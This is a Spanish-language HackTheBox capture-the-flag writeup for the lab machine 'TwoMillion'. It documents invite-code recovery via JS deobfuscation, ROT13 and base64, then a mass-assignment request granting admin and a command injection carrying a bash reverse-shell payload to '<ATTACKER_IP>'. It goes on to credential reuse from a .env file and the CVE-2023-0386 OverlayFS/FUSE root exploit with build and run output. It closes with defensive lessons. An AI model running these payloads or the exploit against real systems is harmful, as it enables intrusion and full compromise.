---
title: "TwoMillion"
date: 2026-06-27
categories: [HackTheBox, Easy]
tags: [linux, nginx, javascript deobfuscation, dean edwards packer, rot13, base64, API enumeration, mass assignment, command injection, credential reuse, CVE, CVE-2023-0386, OverlayFS, FUSE, kernel exploit]
image:
  path: /assets/img/HTB/TwoMillion/banner.png
  alt: TwoMillion writeup
---


Aplicación a medida que protege el registro tras un sistema de invitaciones "secreto" cuyo código está oculto en un archivo JavaScript empaquetado con Dean Edwards; la desofuscación revela un endpoint no autenticado `/api/v1/invite/how/to/generate` que devuelve instrucciones codificadas en ROT13 para llamar a `/api/v1/invite/generate`, que entrega una invitación válida codificada en base64. Una vez registrado, un catálogo de rutas no autenticado en `/api/v1` expone la API de admin completa; un fallo de **mass-assignment** en `PUT /api/v1/admin/settings/update` permite a cualquier usuario autenticado ponerse `is_admin: 1` en su propia cuenta, y el ahora accesible `POST /api/v1/admin/vpn/generate` es vulnerable a **command injection** a través de su parámetro `username`, dando una reverse shell como `www-data`. Movimiento lateral al usuario del SO `admin` mediante credenciales de BD reutilizadas de `/var/www/html/.env`; escalada de privilegios vía **CVE-2023-0386**, un fallo del kernel en OverlayFS/FUSE que concede la ejecución setuid de un binario alojado en FUSE como root.

| Campo      | Detalles            |
|------------|---------------------|
| Plataforma | HackTheBox          |
| Dificultad | Fácil               |
| SO         | Linux               |
| IP         | 10.129.229.66       |
| Fecha      | Junio 2026          |

## Herramientas utilizadas

| Herramienta      | Descripción                                                                       |
|------------------|-----------------------------------------------------------------------------------|
| nmap             | Escáner de puertos e identificación de servicios                                  |
| Browser DevTools | Inspección de JavaScript y desofuscación del packer de Dean Edwards               |
| curl             | Interacción en crudo con la API durante la cadena de generación de la invitación  |
| Python 3         | Ayudante de decodificación ROT13                                                  |
| Burp Suite       | Elaboración de los payloads de mass-assignment y command injection                |
| netcat (nc)      | Listener de reverse shell para el acceso inicial por command injection            |
| su               | Movimiento lateral con la credencial de BD reutilizada                            |
| Python http.server | Servir el zip del exploit del kernel al objetivo                                 |
| make / gcc       | Compilación de la PoC de CVE-2023-0386 dentro del objetivo                         |

## Reconocimiento y enumeración

El objetivo de esta fase era enumerar los servicios expuestos e identificar el stack de aplicación que merecía la pena atacar.

### Descubrimiento del host

Accesibilidad y pista del SO vía ICMP:

```bash
ping -c 1 10.129.229.66
PING 10.129.229.66 (10.129.229.66) 56(84) bytes of data.
64 bytes from 10.129.229.66: icmp_seq=1 ttl=63 time=47.7 ms
```

Un TTL de 63 indica un host Linux (por defecto 64, decrementado una vez al cruzar el salto de enrutamiento).

### Escaneo de puertos

Un escaneo SYN sobre los 65535 puertos TCP a alta velocidad de paquetes, seguido de detección de versiones dirigida:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.229.66 -oG allPorts
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

```bash
sudo nmap -p22,80 -sCV 10.129.229.66 -oN nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

Dos puertos — SSH y HTTP. OpenSSH 8.9p1 es actual y es poco probable que sea un punto de entrada directo; HTTP pasó a ser el foco. La redirección a `2million.htb` confirmó virtual hosting basado en nombre, así que el dominio se añadió al `/etc/hosts`:

```bash
echo "10.129.229.66 2million.htb" | sudo tee -a /etc/hosts
```

### Aplicación web

Navegar a `http://2million.htb/` cargó el sitio de marketing de la página histórica de celebración de "2 millones de usuarios" de HackTheBox. El elemento interesante era la ruta **/invite**, que presentaba un formulario de registro controlado por un código de invitación. Sin código en mano, sin forma obvia de pedir uno — lo que significaba que el mecanismo de emisión de invitaciones tenía que estar en algún sitio del lado del cliente.

Inspeccionar el código fuente de la página reveló un archivo JavaScript sospechoso:

```bash
curl -s http://2million.htb/js/inviteapi.min.js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

La firma `eval(function(p,a,c,k,e,d){...})` identifica esto como el **"Packer" de Dean Edwards** — un minificador de JavaScript de 2007 que convierte código legible en una única llamada `eval()` de una línea. No es cifrado; es un esquema de sustitución de cadenas que el runtime deshace inmediatamente en el momento del `eval()`, y cualquier consola de desarrollador puede recuperar el original reemplazando `eval` por `console.log`. El código fuente desofuscado:

```javascript
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) { console.log(response); },
        error:   function(response) { console.log(response); }
    });
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) { console.log(response); },
        error:   function(response) { console.log(response); }
    });
}
```

Dos funciones, ambas apuntando a un namespace `/api/v1/invite/`. La función `makeInviteCode()` es la pista — la aplicación expone explícitamente un endpoint que *te dice cómo crear un código de invitación*, presumiblemente el punto de entrada para administradores recién incorporados que nadie se acordó de proteger tras autenticación.

## Explotación

### Cadena de generación del código de invitación — desofuscación JS → ROT13 → base64

Acceder al endpoint "how to generate" directamente devolvió una pista:

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

La respuesta es internamente consistente de una forma deliciosamente autodestructiva: etiqueta la codificación como **`ROT13`** en el campo `enctype`, anuncia que el payload está "cifrado" e incluye una pista que sugiere al lector "comprobar el tipo de cifrado" — que el servidor acaba de revelar. ROT13 es el cifrado César trivial con desplazamiento 13, simétrico de por sí (codificar dos veces devuelve el original), y cualquier rutina de texto puede invertirlo:

```python
import codecs
texto_cifrado = "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
print(codecs.decode(texto_cifrado, 'rot_13'))
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

La instrucción decodificada es a su vez otro endpoint no autenticado. Llamarlo devuelve el código:

```bash
curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"N1FPREstVVNVTkEtQ04wNUstQ1BJS0s=","format":"encoded"}}
```

El campo `format: encoded` es la segunda pista — base64 en este caso:

```bash
echo "N1FPREstVVNVTkEtQ04wNUstQ1BJS0s=" | base64 -d
7QODK-USUNA-CN05K-CPIKK
```

Un código de invitación válido, usado para registrar una nueva cuenta a través del formulario estándar:

![Registration form populated with the recovered invite code](/assets/img/HTB/TwoMillion/cap1.png)

### Enumeración de la API — catálogo de rutas `/api/v1`

Una sesión logueada abre una superficie de ataque mucho mayor, pero el siguiente hallazgo era aún más interesante. La aplicación expone un catálogo de rutas en `/api/v1`:

```bash
curl -s http://2million.htb/api/v1
{
  "v1": {
    "user": {
      "GET":  { "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
                "/api/v1/invite/generate":        "Generate invite code",
                "/api/v1/invite/verify":          "Verify invite code",
                "/api/v1/user/auth":              "Check if user is authenticated",
                "/api/v1/user/vpn/generate":      "Generate a new VPN configuration",
                "/api/v1/user/vpn/regenerate":    "Regenerate VPN configuration",
                "/api/v1/user/vpn/download":      "Download OVPN file" },
      "POST": { "/api/v1/user/register":          "Register a new user",
                "/api/v1/user/login":             "Login with existing user" }
    },
    "admin": {
      "GET":  { "/api/v1/admin/auth":             "Check if user is admin" },
      "POST": { "/api/v1/admin/vpn/generate":     "Generate VPN for specific user" },
      "PUT":  { "/api/v1/admin/settings/update":  "Update user settings" }
    }
  }
}
```

Tres endpoints administrativos. La ruta `PUT /api/v1/admin/settings/update` es el objetivo obvio para la escalada de privilegios — cualquier cosa llamada "update settings" que un admin pueda usar implicará escribir valores controlados por el usuario en un registro de usuario. Si la implementación es ingenua, también podría dejar que un usuario normal escriba campos que no debería poder.

### Mass-assignment en `/api/v1/admin/settings/update`

El **mass-assignment** es una vulnerabilidad web clásica donde un endpoint acepta un cuerpo JSON y copia ciegamente cada campo de la petición a un objeto de backend — sin filtrar qué campos son modificables por el usuario. En un endpoint de "update settings", el desarrollador espera que el usuario envíe `{"email": "..."}` y actualiza el email. Pero si el backend simplemente itera sobre las claves del JSON y asigna cada una a la columna correspondiente en la tabla `users`, cualquier cosa con nombre de columna — incluidos `is_admin`, `is_verified`, `password_hash` — se vuelve controlada por el atacante.

El primer sondeo estableció el comportamiento de validación de entrada del endpoint. Enviar un PUT con `Content-Type: application/x-www-form-urlencoded` falló en la primera barrera:

![Burp request with form Content-Type returning Invalid content type](/assets/img/HTB/TwoMillion/cap2.png)

La respuesta (`Invalid content type`) es en sí una fuga de información — el endpoint espera JSON. Enviar un cuerpo JSON vacío confirmó la siguiente barrera:

![Burp request with empty JSON body returning Missing parameter: email](/assets/img/HTB/TwoMillion/cap3.png)

`Missing parameter: email`. El endpoint requiere `email`. Añadir un email válido pero con un cuerpo malformado (coma final) seguía tropezando con la comprobación de parseo / parámetros.

La petición decisiva añadió tanto `email` como el campo no autorizado `is_admin: 1`:

![Burp request with email and is_admin:1 returning a successful user record with is_admin:1](/assets/img/HTB/TwoMillion/cap4.png)

```http
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=ani347blobjh3dd9pebhu3h1o7

{"email":"monre@monre.com","is_admin":1}

HTTP/1.1 200 OK
{"id":14,"username":"monre","is_admin":1}
```

La respuesta es la pista clave — el servidor devolvió el registro de usuario actualizado mostrando `is_admin: 1`. El fallo total del endpoint a la hora de filtrar los campos escribibles significaba que cualquier usuario autenticado podía concederse derechos administrativos con una única petición PUT.

La confirmación llegó de un endpoint distinto, la comprobación de estado de admin:

![GET /api/v1/admin/auth returning message:true confirming admin role](/assets/img/HTB/TwoMillion/cap5.png)

```http
GET /api/v1/admin/auth?user=monre@monre.com HTTP/1.1
...
HTTP/1.1 200 OK
{"message":true}
```

Ahora los endpoints de admin previamente protegidos eran accesibles, incluido `POST /api/v1/admin/vpn/generate`.

### Command injection en `/api/v1/admin/vpn/generate`

El endpoint de generación de VPN existe para emitir configuraciones de OpenVPN para usuarios arbitrarios — una función que un admin usaría legítimamente para incorporar nuevos operadores. El primer sondeo reveló el parámetro esperado:

![Empty POST returning Missing parameter: username](/assets/img/HTB/TwoMillion/cap6.png)

Una llamada válida devolvió una configuración de cliente OpenVPN:

![POST with username returning a full OpenVPN configuration file](/assets/img/HTB/TwoMillion/cap7.png)

La presencia de un `client.ovpn` completo en la respuesta — con bloques `<ca>`, `<cert>`, `<key>`, suites de cifrado y endpoints remotos — es en sí una señal fuerte. La aplicación casi con seguridad está **lanzando un shell** hacia las herramientas de espacio de usuario de OpenVPN (algo como `easyrsa build-client-full $username` o un script wrapper a medida) y capturando el archivo de configuración resultante del disco. Cada vez que el backend invoca un shell con entrada del usuario como parte de la línea de comandos, la **command injection** es la sospecha por defecto.

El payload estándar de sustitución de shell de Bash — `$(command)` — lo interpreta el shell durante la construcción del comando, así que cualquier cosa que el comando sustituido emita se pliega en la línea de comandos final. Para una reverse shell, el comando sustituido no necesita *emitir* nada; solo necesita *ejecutar* la lógica de lanzamiento de shell como efecto secundario:

Se inició un listener de netcat en la máquina atacante:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
```

El payload de inyección se colocó dentro del campo `username`:

![Burp request with $(bash -c '...') payload inside the username JSON value](/assets/img/HTB/TwoMillion/cap8.png)

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Content-Type: application/json
Cookie: PHPSESSID=ani347blobjh3dd9pebhu3h1o7

{"username":"$(bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1')"}
```

El listener capturó la conexión de vuelta como `www-data`:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.229.66 54966
bash: cannot set terminal process group (1096): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$
```

Una mejora estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) hizo la shell usable.

## Movimiento lateral — `www-data` → `admin`

La comprobación refleja tras cualquier shell en un stack estilo PHP/Laravel es leer el archivo `.env` de la aplicación en el web root. Los frameworks de esa familia cargan `.env` al arrancar y meten cada línea en la configuración de runtime, lo que significa que rutinariamente contiene credenciales de base de datos, claves de API y secretos de firma — todo en texto plano, todo legible por el usuario del servidor web:

```bash
cat /var/www/html/.env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

El usuario de base de datos se llama `admin`, y hay un usuario del sistema llamado `admin` visible en `/etc/passwd`. La hipótesis estándar de reutilización de credenciales — que el operador que montó la base de datos usó la misma contraseña para la cuenta del SO — se probó directamente con `su`:

```bash
su admin
Password: SuperDuperPass123
admin@2million:/var/www/html$ cd && cat user.txt
```

Este es el acceso inicial propiamente dicho. `admin` es el usuario que tiene `user.txt`.

## Escalada de privilegios — `admin` → `root` (CVE-2023-0386)

La enumeración estándar como `admin` volvió vacía: `sudo -l` no devolvió nada útil, no aparecieron anomalías SUID, no había archivos tocados por cron escribibles. El avance llegó de un sitio menos obvio — el spool de correo del usuario:

```bash
cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Subject: Urgent: Patch System OS

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're
partially down, can you also upgrade the OS on our web host? There have been a
few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE
looks nasty. We can't get popped by that.

HTB Godfather
```

El correo es una pista deliberada: hay una CVE seria del kernel en **OverlayFS / FUSE** que el admin aún no ha parcheado. Comprobando el kernel en ejecución:

```bash
uname -r
5.15.70-051570-generic
```

Kernel 5.15.70 — bien dentro del rango vulnerable para **CVE-2023-0386**, publicada a principios de 2023 y que afecta a los kernels Linux anteriores al 6.2.

### Entendiendo CVE-2023-0386

El **OverlayFS** del kernel Linux es el sistema de archivos de union-mount que permite a Docker, AppImage y sistemas similares superponer un sistema de archivos "superior" escribible sobre uno "inferior" de solo lectura. **FUSE** ("Filesystem in Userspace") permite a usuarios sin privilegios montar sistemas de archivos cuyo contenido sirve un proceso de espacio de usuario normal.

El bug vive en la interacción entre estos dos: cuando un archivo se copia de la capa inferior a la superior (la operación estándar de "copy-up" que ocurre en la primera escritura), el kernel preserva el **bit setuid** del archivo — incluso cuando la capa inferior es un sistema de archivos FUSE que el usuario sin privilegios controla. Normalmente, los sistemas de archivos FUSE tienen `nosuid` aplicado en el momento del montaje para que un binario malicioso servido por FUSE no pueda tener el setuid honrado. Pero el copy-up de OverlayFS sortea esa aplicación: copia el archivo con el setuid intacto a un sistema de archivos real (`tmpfs` o similar) donde el setuid *sí* se honra, y el archivo resultante puede ejecutarse como root.

La cadena del exploit es por tanto:

1. Montar un sistema de archivos FUSE bajo el control del usuario, sirviendo un binario cuyo propietario se reporta como `root` y cuyo modo incluye setuid.
2. Montar un OverlayFS con ese sistema de archivos FUSE como capa inferior.
3. Disparar un copy-up en el binario (cualquier intento de escritura basta).
4. Ejecutar el binario copiado — ahora tiene el setuid honrado porque vive en un sistema de archivos real.
5. El `setuid(0)` del binario más `execve("/bin/bash")` produce una shell de root.

La PoC pública de `sxlmnwb` (`CVE-2023-0386` en GitHub) implementa exactamente este flujo, repartido en tres binarios:
- `fuse` — el servidor FUSE de espacio de usuario que publica el binario malicioso
- `gc` (getshell.c) — el binario setuid que hace la transición de privilegios
- `exp` — el montaje de OverlayFS + el disparador

### Compilación y explotación

La PoC se clonó en la máquina atacante y se comprimió para la entrega:

```bash
git clone https://github.com/sxlmnwb/CVE-2023-0386.git
zip -r CVE-2023-0386.zip CVE-2023-0386
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Descargada desde el objetivo y desempaquetada:

```bash
wget http://<ATTACKER_IP>:8000/CVE-2023-0386.zip
unzip CVE-2023-0386.zip
cd CVE-2023-0386
```

Compilada localmente en el objetivo (el Makefile produce los tres binarios en un paso):

```bash
make all
gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
gcc -o exp exp.c -lcap
gcc -o gc getshell.c
```

El exploit necesita dos terminales corriendo concurrentemente. El primero lanza el sistema de archivos FUSE y lo mantiene montado:

```bash
./fuse ./ovlcap/lower ./gc
[+] len of gc: 0x3ee0
[+] readdir
[+] getattr_callback
/file
[+] open_callback
/file
[+] read buf callback
```

En un segundo terminal (una sesión `su admin` nueva), el montaje de OverlayFS + el disparador:

```bash
./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun 27 13:10 .
drwxrwxr-x 6 root   root     4096 Jun 27 13:10 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
root@2million:~/CVE-2023-0386# whoami
root
root@2million:~/CVE-2023-0386# cat /root/root.txt
```

Los permisos `-rwsrwxrwx` del archivo (con la `s` en la posición del propietario) confirman que el setuid se preservó a través del copy-up — ese es el bug, visible en la capa del sistema de archivos. Ejecutar el archivo con `setuid(0)` integrado es lo que cambió el EUID a 0.

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Conclusiones clave

- **La ofuscación del lado del cliente no es seguridad.** El packer de Dean Edwards era un minificador en 2007 y una curiosidad en 2010; tratarlo como control de acceso en 2023 es un error de categoría. Cualquier ruta de código cuya seguridad dependa de que el cliente no lea su propio JavaScript está rota por construcción. Lo mismo aplica a la minificación de JS, al stripping de source-maps y a las URLs de API empaquetadas en workers — todas ellas recuperables por cualquier lector motivado.
- **"Tipo de cifrado: ROT13"** es el ejemplo canónico de confundir **codificación** con **cifrado**. La codificación es reversible por cualquiera (base64, hex, URL-encoding, ROT13); el cifrado requiere una clave que el atacante no debería tener. La API de TwoMillion no solo usó ROT13 sino que lo *etiquetó como tal en la respuesta*, lo que derriba cualquier pretensión de obstáculo. Asume siempre que cualquier ofuscación que no requiera un secreto es reversible en segundos.
- **Los catálogos de rutas `/api/v1` son un documento de superficie de ataque de autoservicio.** La descubribilidad es una comodidad para el desarrollador que se vuelve una comodidad para el atacante cuando se envía a producción. Los listados de rutas públicos nunca deberían incluir endpoints privilegiados, aunque esos endpoints estén ellos mismos autenticados — le dicen al atacante exactamente qué puertas probar.
- **El mass-assignment es el bug web canónico de "confiar en la capa equivocada".** La solución está en la capa del modelo (lista blanca explícita de qué campos puede escribir el cuerpo de la petición — Rails lo llama `permit_params`, Laravel lo llama `$fillable`), no en la capa de validación. Un controlador que filtra la entrada es una mitigación por ruta; un modelo que restringe la asignación es estructural. Los endpoints con `is_admin` escribible desde un cuerpo JSON controlado por el usuario casi siempre indican que la capa del modelo se sorteó por completo.
- **La interpolación en shell de entrada del usuario es RCE directo.** Cualquier ruta de código que construye una línea de comandos de shell a partir de parámetros de la petición — aunque el parámetro sea "solo un username" — está a un `$(...)` de la ejecución arbitraria. La solución correcta es usar APIs estilo `execve` que toman un array de argv, sorteando el parseo del shell por completo. La solución incorrecta es escapar la entrada; los escapes acaban equivocándose con las reglas de codificación y el bug vuelve.
- **Los archivos `.env` en los document roots son una disclosure de credenciales pre-autenticación esperando a ocurrir.** Incluso cuando no se sirven directamente (la mayoría de los servidores web se niegan a servir dotfiles), son legibles por cada proceso que corre como el usuario del servidor web — lo que significa que cualquier vulnerabilidad de ejecución de código los filtra de inmediato. Las credenciales de dentro se reutilizan rutinariamente entre la base de datos, los servicios internos y las cuentas del SO. Los secretos de producción pertenecen a un gestor de secretos (Vault, AWS Secrets Manager, secrets de Kubernetes), no a un archivo que comparte directorio con scripts PHP.
- **El parcheo del kernel es la última capa de defensa y la que más a menudo se aplaza.** Una CVE del kernel de 2023 aún explotable a mediados de 2026 es el tipo de hallazgo que convierte un compromiso web contenido en una toma de control total como root. Los recordatorios fuera de banda ("por favor, parchea el SO") no son un sustituto de los unattended-upgrades o equivalente. Cualquier host que corra servicios de cara a internet debería tener su kernel auto-parcheado, y `uname -r` debería ser un paso rutinario de enumeración post-explotación precisamente porque la respuesta es muy a menudo "no, no está parcheado".
